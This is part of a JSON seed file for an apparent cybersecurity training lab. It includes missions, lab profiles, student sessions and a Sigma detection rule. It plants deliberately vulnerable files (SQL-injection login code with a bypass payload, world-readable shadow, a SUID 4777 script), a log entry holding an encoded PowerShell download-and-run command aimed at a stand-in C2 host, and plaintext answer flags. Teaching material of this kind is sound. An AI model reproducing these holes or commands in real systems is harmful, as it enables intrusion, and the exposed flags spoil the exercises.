+        "m-def-02",
+        "m-def-03"
+      ],
+      "submissionType": "REPORT",
+      "learningObjectives": [
+        "Structure an executive and technical cybersecurity incident report",
+        "Document Root Cause Analysis (RCA)",
+        "Propose immediate containment and long-term eradication steps"
+      ],
+      "threatModel": "Incomplete incident documentation leads to premature closure and re-infection by persistent adversaries.",
+      "taskInstructions": "Submit a comprehensive Incident Report (minimum 80 words) summarizing the PowerShell malicious macro incident. Must include the sections: [Executive Summary], [Root Cause], [Containment Actions], and [Long-term Hardening].",
+      "taskInstructionsAr": "أرسل تقريراً شاملاً لفرز الحادث (بحد أدنى 80 كلمة) يغطي حادث ماكرو وورد و PowerShell. يجب أن يتضمن: [Executive Summary], [Root Cause], [Containment Actions], [Long-term Hardening].",
+      "hints": [
+        {
+          "index": 1,
+          "title": "Required sections",
+          "content": "Ensure your report contains the headers: Executive Summary, Root Cause, Containment Actions, Long-term Hardening and at least 80 words.",
+          "xpPenalty": 20
+        }
+      ],
+      "validationRules": {},
+      "remediationGuidance": "Establish an Incident Response Playbook aligned with NIST SP 800-61 Rev. 2.",
+      "isPublished": true,
+      "author": "SidoDev-Dz",
+      "createdAt": "2026-10-09T00:00:00Z"
+    }
+  ],
+  "labProfiles": [
+    {
+      "id": "lab-linux-permissions",
+      "name": "Linux Permissions & SUID Audit Environment",
+      "category": "LINUX",
+      "dockerImage": "roguebyte/linux-audit:1.0",
+      "initialFiles": {
+        "/etc/shadow": {
+          "content": "root:$6$salt$hashedpassword:19800:0:99999:7:::\nstudent:$6$salt2$studenthash:19800:0:99999:7:::\n",
+          "permissions": "0644",
+          "owner": "root:root"
+        },
+        "/var/www/html/config.php": {
+          "content": "<?php\n$db_host = \"10.0.4.15\";\n$db_user = \"db_admin\";\n$db_pass = \"S3cur3P@ssw0rd2026!\";\n?>\n",
+          "permissions": "0666",
+          "owner": "www-data:www-data"
+        },
+        "/usr/local/bin/backup_tool": {
+          "content": "#!/bin/bash\n# SUID backup runner\ntar -czf /tmp/backup.tar.gz /var/log\n",
+          "permissions": "4777",
+          "owner": "root:root"
+        },
+        "/home/student/audit_checklist.txt": {
+          "content": "MISSION AUDIT CHECKLIST:\n1. Audit /etc/shadow permissions. It should NOT be readable by normal users.\n2. Audit /var/www/html/config.php. Remove world write permissions.\n3. Identify SUID binaries that have insecure permissions.\nFLAG_SUID_DISCOVERY = ROGUE{su1d_p3rm1ss10n_3xp0s3d_2026}\n",
+          "permissions": "0640",
+          "owner": "student:student"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    },
+    {
+      "id": "lab-linux-auth-logs",
+      "name": "Linux Authentication Log Forensics Sandbox",
+      "category": "LINUX",
+      "dockerImage": "roguebyte/log-forensics:1.0",
+      "initialFiles": {
+        "/var/log/auth.log": {
+          "content": "Oct 09 03:12:01 server sshd[12450]: Accepted publickey for admin from 192.168.1.50 port 52314 ssh2\nOct 09 03:14:22 server sshd[12480]: Failed password for invalid user root from 203.0.113.88 port 41200 ssh2\nOct 09 03:14:24 server sshd[12482]: Failed password for invalid user admin from 203.0.113.88 port 41202 ssh2\nOct 09 03:14:26 server sshd[12484]: Failed password for invalid user test from 203.0.113.88 port 41204 ssh2\nOct 09 03:14:29 server sshd[12486]: Failed password for invalid user backup from 203.0.113.88 port 41206 ssh2\nOct 09 03:14:32 server sshd[12488]: Failed password for invalid user oracle from 203.0.113.88 port 41208 ssh2\nOct 09 03:14:35 server sshd[12490]: Failed password for invalid user guest from 203.0.113.88 port 41210 ssh2\nOct 09 03:14:40 server sshd[12495]: Accepted password for deploy from 203.0.113.88 port 41215 ssh2\nOct 09 03:14:41 server sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /root/flag.txt\n",
+          "permissions": "0640",
+          "owner": "syslog:adm"
+        },
+        "/root/flag.txt": {
+          "content": "ROGUE{brut3_f0rc3_c0mpr0m1s3_203.0.113.88}\n",
+          "permissions": "0600",
+          "owner": "root:root"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    },
+    {
+      "id": "lab-network-pcap",
+      "name": "PCAP Packet Inspection & Traffic Analysis Terminal",
+      "category": "NETWORKING",
+      "dockerImage": "roguebyte/net-analyzer:1.0",
+      "initialFiles": {
+        "/home/analyst/evidence.pcap": {
+          "content": "[PCAP STREAM DUMP: 142 PACKETS CAPTURED]\nPKT#1  0.000000 10.10.10.25 -> 10.10.10.1   DNS Standard query 0x1a2b A internal-payroll.corp\nPKT#2  0.000412 10.10.10.1  -> 10.10.10.25  DNS Standard query response 0x1a2b A 10.10.10.80\nPKT#3  0.001200 10.10.10.25 -> 10.10.10.80  TCP 49152 -> 80 [SYN]\nPKT#4  0.001500 10.10.10.80 -> 10.10.10.25  TCP 80 -> 49152 [SYN, ACK]\nPKT#5  0.001800 10.10.10.25 -> 10.10.10.80  TCP 49152 -> 80 [ACK]\nPKT#6  0.002200 10.10.10.25 -> 10.10.10.80  HTTP POST /api/auth/login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: internal-payroll.corp\nPayload: username=auditor_mike&password=ClearTextSecretPayrollPass2026!&auth_flag=ROGUE{pl41nt3xt_cr3ds_sn1ff3d_8080}\nPKT#7  0.003100 10.10.10.80 -> 10.10.10.25  HTTP 200 OK (text/json) {\"status\":\"authenticated\"}\nPKT#8  1.450000 10.10.10.25 -> 198.51.100.44 TCP 51220 -> 4444 [SYN] - Outbound C2 Beacon\n",
+          "permissions": "0644",
+          "owner": "analyst:analyst"
+        },
+        "/home/analyst/notes.txt": {
+          "content": "Inspect evidence.pcap using the built-in commands: cat, grep, or analyzer tools.\nLocate the unencrypted HTTP login request and extract the credentials and the flag.\n",
+          "permissions": "0644",
+          "owner": "analyst:analyst"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    },
+    {
+      "id": "lab-network-nmap",
+      "name": "Nmap Port Scan & Service Enumeration Lab",
+      "category": "NETWORKING",
+      "dockerImage": "roguebyte/nmap-lab:1.0",
+      "initialFiles": {
+        "/home/operator/target_scan.txt": {
+          "content": "Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-09 04:00 UTC\nNmap scan report for target-internal.sec (172.16.20.105)\nHost is up (0.00082s latency).\nNot shown: 994 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           vsftpd 2.3.4 (Backdoored service detected!)\n22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6\n80/tcp   open  http          Apache httpd 2.4.52 ((Ubuntu))\n443/tcp  open  ssl/https     Apache httpd 2.4.52\n3306/tcp open  mysql         MySQL 8.0.35-0ubuntu0.22.04.1\n8080/tcp open  http-proxy    Werkzeug/2.2.2 Python/3.10.12 (Debug mode active)\n| http-title: RogueByte Target Internal Management Console\n|_FLAG: ROGUE{vsftpd_b4ckd00r_p0rt_21_f0und}\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any critical findings to the Security Operations Center.\n",
+          "permissions": "0644",
+          "owner": "operator:operator"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    },
+    {
+      "id": "lab-web-sqli",
+      "name": "Web Security SQL Injection Laboratory",
+      "category": "WEB_SECURITY",
+      "dockerImage": "roguebyte/web-sqli:1.0",
+      "initialFiles": {
+        "/var/www/app/auth.py": {
+          "content": "# Deliberately vulnerable authentication handler\nimport sqlite3\n\ndef check_login(username, password):\n    # VULNERABILITY: String concatenation without parameterized queries!\n    query = f\"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'\"\n    print(f\"DEBUG EXECUTING QUERY: {query}\")\n    # Injected with: ' OR '1'='1' -- \n    # Bypasses authentication and returns the first record (Administrator)\n    return query\n",
+          "permissions": "0644",
+          "owner": "www-data:www-data"
+        },
+        "/var/www/app/schema.sql": {
+          "content": "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT, flag TEXT);\nINSERT INTO users VALUES (1, 'administrator', 'admin', 'ROGUE{sql1_auth_byp4ss_succ3ssful_992}');\nINSERT INTO users VALUES (2, 'support_agent', 'support', 'none');\n",
+          "permissions": "0644",
+          "owner": "www-data:www-data"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    },
+    {
+      "id": "lab-defensive-siem",
+      "name": "Defensive SIEM & Sigma Detection Studio",
+      "category": "DEFENSIVE",
+      "dockerImage": "roguebyte/siem-studio:1.0",
+      "initialFiles": {
+        "/var/log/siem/incident_events.json": {
+          "content": "[\n  {\n    \"timestamp\": \"2026-10-09T02:11:00Z\",\n    \"event_id\": \"SEC-4688\",\n    \"process\": \"cmd.exe\",\n    \"command_line\": \"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcgBvAGcAdQBlAGIAeQB0AGUALgBsAGEAYgAvAHIAZQB2AC4AcABzADEAJwApAA==\",\n    \"user\": \"DESKTOP-FINANCE\\\\bob\",\n    \"parent_process\": \"WINWORD.EXE\"\n  },\n  {\n    \"timestamp\": \"2026-10-09T02:12:15Z\",\n    \"event_id\": \"SEC-7045\",\n    \"service_name\": \"BackdoorSvc\",\n    \"image_path\": \"C:\\\\Windows\\\\Temp\\\\svc_agent.exe\",\n    \"user\": \"NT AUTHORITY\\\\SYSTEM\"\n  }\n]",
+          "permissions": "0644",
+          "owner": "soc:soc"
+        },
+        "/home/soc/sigma_template.yml": {
+          "content": "title: Suspicious PowerShell Download via Word Macro\nid: d76b19a8-39f8-41b2-bfdc-7164923e1f0a\nstatus: experimental\ndescription: Detects WINWORD spawning hidden PowerShell execution\nauthor: SidoDev-Dz\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    ParentImage|endswith: '\\WINWORD.EXE'\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - '-enc'\n      - '-ExecutionPolicy Bypass'\n  condition: selection\nlevel: critical\ntags:\n  - attack.execution\n  - attack.t1059.001\n",
+          "permissions": "0644",
+          "owner": "soc:soc"
+        }
+      },
+      "resourceLimits": {
+        "cpu": "0.5",
+        "memoryMb": 256,
+        "maxProcesses": 32,
+        "timeoutMinutes": 30
+      }
+    }
+  ],
+  "labSessions": [
+    {
+      "id": "lab-fa2d7d9c-7",
+      "missionId": "m-linux-03",
+      "userId": "usr-student-01",
+      "profileId": "lab-linux-permissions",
+      "status": "STOPPED",
+      "createdAt": "2026-10-09T12:20:47.346Z",
+      "expiresAt": "2026-10-09T12:50:47.346Z",
+      "ipAddress": "127.0.0.1",
+      "terminalHistory": [
+        "\u001b[1;32m[+] RogueByte Isolated Lab Runtime v1.0\u001b[0m",
+        "\u001b[1;30mTarget profile: Linux Permissions & SUID Audit Environment [Image: roguebyte/linux-audit:1.0]\u001b[0m",
+        "\u001b[1;30mResource constraints: CPU 0.5 core, Memory: 256MB\u001b[0m",
+        "\u001b[1;33mSession expires in 30 minutes. Type 'help' for available commands.\u001b[0m\n",
+        "student@roguebyte-lab:~$ whoami",
+        "student",
+        "student@roguebyte-lab:~$ ls /home/student",
+        "/home/student/audit_checklist.txt",
+        "student@roguebyte-lab:~$ chmod 0640 /etc/shadow",
+        "mode of '/etc/shadow' changed to 0640",
+        "student@roguebyte-lab:~$ chmod 0640 /var/www/html/config.php",
+        "mode of '/var/www/html/config.php' changed to 0640"
+      ],
+      "currentFiles": {
+        "/etc/shadow": {
+          "content": "root:$6$salt$hashedpassword:19800:0:99999:7:::\nstudent:$6$salt2$studenthash:19800:0:99999:7:::\n",
+          "permissions": "0640",
+          "owner": "root:root"
+        },
+        "/var/www/html/config.php": {
+          "content": "<?php\n$db_host = \"10.0.4.15\";\n$db_user = \"db_admin\";\n$db_pass = \"S3cur3P@ssw0rd2026!\";\n?>\n",
+          "permissions": "0640",
+          "owner": "www-data:www-data"
+        },
+        "/usr/local/bin/backup_tool": {
+          "content": "#!/bin/bash\n# SUID backup runner\ntar -czf /tmp/backup.tar.gz /var/log\n",
+          "permissions": "4777",
+          "owner": "root:root"
+        },
+        "/home/student/audit_checklist.txt": {
+          "content": "MISSION AUDIT CHECKLIST:\n1. Audit /etc/shadow permissions. It should NOT be readable by normal users.\n2. Audit /var/www/html/config.php. Remove world write permissions.\n3. Identify SUID binaries that have insecure permissions.\nFLAG_SUID_DISCOVERY = ROGUE{su1d_p3rm1ss10n_3xp0s3d_2026}\n",
+          "permissions": "0640",
+          "owner": "student:student"
+        }
+      },
+      "executedCommandsCount": 4,
+      "lastActiveAt": "2026-10-09T12:20:47.351Z"
+    },
+    {
+      "id": "lab-f56dedaa-8",
+      "missionId": "m-linux-03",
+      "userId": "usr-student-01",
+      "profileId": "lab-linux-permissions",
+      "status": "STOPPED",
+      "createdAt": "2026-10-09T12:21:09.360Z",
+      "expiresAt": "2026-10-09T12:51:09.360Z",
+      "ipAddress": "127.0.0.1",
+      "terminalHistory": [
+        "\u001b[1;32m[+] RogueByte Isolated Lab Runtime v1.0\u001b[0m",
+        "\u001b[1;30mTarget profile: Linux Permissions & SUID Audit Environment [Image: roguebyte/linux-audit:1.0]\u001b[0m",
+        "\u001b[1;30mResource constraints: CPU 0.5 core, Memory: 256MB\u001b[0m",
+        "\u001b[1;33mSession expires in 30 minutes. Type 'help' for available commands.\u001b[0m\n",
+        "student@roguebyte-lab:~$ whoami",
+        "student",
+        "student@roguebyte-lab:~$ ls /home/student",
+        "/home/student/audit_checklist.txt",
+        "student@roguebyte-lab:~$ chmod 0640 /etc/shadow",
+        "mode of '/etc/shadow' changed to 0640",
+        "student@roguebyte-lab:~$ chmod 0640 /var/www/html/config.php",
+        "mode of '/var/www/html/config.php' changed to 0640"
+      ],
+      "currentFiles": {
+        "/etc/shadow": {
+          "content": "root:$6$salt$hashedpassword:19800:0:99999:7:::\nstudent:$6$salt2$studenthash:19800:0:99999:7:::\n",
+          "permissions": "0640",
+          "owner": "root:root"
+        },
+        "/var/www/html/config.php": {
+          "content": "<?php\n$db_host = \"10.0.4.15\";\n$db_user = \"db_admin\";\n$db_pass = \"S3cur3P@ssw0rd2026!\";\n?>\n",
+          "permissions": "0640",
+          "owner": "www-data:www-data"
+        },
+        "/usr/local/bin/backup_tool": {
+          "content": "#!/bin/bash\n# SUID backup runner\ntar -czf /tmp/backup.tar.gz /var/log\n",
+          "permissions": "4777",
+          "owner": "root:root"
+        },
+        "/home/student/audit_checklist.txt": {
+          "content": "MISSION AUDIT CHECKLIST:\n1. Audit /etc/shadow permissions. It should NOT be readable by normal users.\n2. Audit /var/www/html/config.php. Remove world write permissions.\n3. Identify SUID binaries that have insecure permissions.\nFLAG_SUID_DISCOVERY = ROGUE{su1d_p3rm1ss10n_3xp0s3d_2026}\n",
+          "permissions": "0640",
+          "owner": "student:student"
+        }
+      },
+      "executedCommandsCount": 4,
+      "lastActiveAt": "2026-10-09T12:21:09.369Z"
+    }
+  ],
+  "attempts": [
+    {
+      "id": "att-seed-01",
+      "missionId": "m-linux-01",
+      "userId": "usr-student-01",
+      "startedAt": "2026-10-09T00:50:00Z",
+      "completedAt": "2026-10-09T01:00:00Z",
+      "status": "COMPLETED",
+      "earnedXp": 100,
+      "hintsUsed": [],
+      "submissionsCount": 1
+    }
+  ],
+  "submissions": [
+    {
+      "id": "sub-seed-01",
+      "attemptId": "att-seed-01",
+      "missionId": "m-linux-01",
+      "userId": "usr-student-01",
+      "submissionType": "FLAG",
+      "content": "ROGUE{su1d_p3rm1ss10n_3xp0s3d_2026}",
+      "submittedAt": "2026-10-09T01:00:00Z",
+      "isCorrect": true,
+      "score": 100,
+      "feedback": "Flag verified successfully! File permissions properly investigated."
+    }
+  ],
+  "userBadges": [
+    {
+      "id": "ub-01",
+      "userId": "usr-student-01",
+      "badgeId": "badge-first-blood",
+      "awardedAt": "2026-10-09T01:00:00Z"
+    }
+  ],
+  "certificates": [],
+  "auditEvents": [
+    {
+      "userId": "usr-student-01",
+      "action": "LAB_SESSION_TERMINATED",
+      "category": "LAB",
+      "details": "Lab session lab-f56dedaa-8 manually terminated.",
+      "ipAddress": "127.0.0.1",
+      "status": "SUCCESS",
+      "id": "audit-9e2bde8e",
+      "timestamp": "2026-10-09T12:21:09.370Z"
+    },
+    {
+      "userId": "usr-student-01",
+      "action": "LAB_SESSION_STARTED",
+      "category": "LAB",
+      "details": "Started isolated lab session lab-f56dedaa-8 for mission correct-file-permissions (roguebyte/linux-audit:1.0)",
+      "ipAddress": "127.0.0.1",
+      "status": "SUCCESS",
+      "id": "audit-40456780",
+      "timestamp": "2026-10-09T12:21:09.362Z"
+    },
+    {
+      "userId": "usr-student-01",
+      "action": "LAB_SESSION_TERMINATED",
+      "category": "LAB",
+      "details": "Lab session lab-fa2d7d9c-7 manually terminated.",
+      "ipAddress": "127.0.0.1",
+      "status": "SUCCESS",
+      "id": "audit-04c3a45e",
+      "timestamp": "2026-10-09T12:20:47.352Z"
+    },
+    {
+      "userId": "usr-student-01",
+      "action": "LAB_SESSION_STARTED",
+      "category": "LAB",
+      "details": "Started isolated lab session lab-fa2d7d9c-7 for mission correct-file-permissions (roguebyte/linux-audit:1.0)",
+      "ipAddress": "127.0.0.1",
+      "status": "SUCCESS",
+      "id": "audit-604ff84d",
+      "timestamp": "2026-10-09T12:20:47.348Z"
+    },
+    {
+      "id": "audit-boot-01",
+      "timestamp": "2026-10-09T12:20:47.210Z",
+      "userId": "usr-admin-01",
+      "username": "SidoDev-Dz",
+      "action": "SYSTEM_BOOTSTRAP",
+      "category": "ADMIN",
+      "details": "RogueByte Cyber Lab initialized with 16 functional training missions and 6 isolated lab profiles.",
+      "ipAddress": "127.0.0.1",
+      "status": "SUCCESS"
+    }
+  ],
+  "assignments": [
+    {
+      "id": "asg-core-01",
+      "title": "Cohort Week 1: Linux & Network Forensics Essentials",
+      "description": "Complete the Linux file inspection mission and the network packet analysis lab.",
+      "missionIds": [
+        "m-linux-01",
+        "m-linux-02",
+        "m-net-02"
+      ],
+      "targetGroup": "Beginner Cohort 2026",
+      "dueDate": "2026-10-16T12:20:47.211Z",
+      "createdById": "usr-instructor-01",
+      "createdAt": "2026-10-09T12:20:47.211Z"
+    }
+  ],
+  "settings": {
+    "maintenanceMode": false,
+    "maxConcurrentLabsPerUser": 1,
+    "defaultLabTimeoutMinutes": 30,
+    "registrationOpen": true,
+    "strictRateLimiting": false
+  }
+}
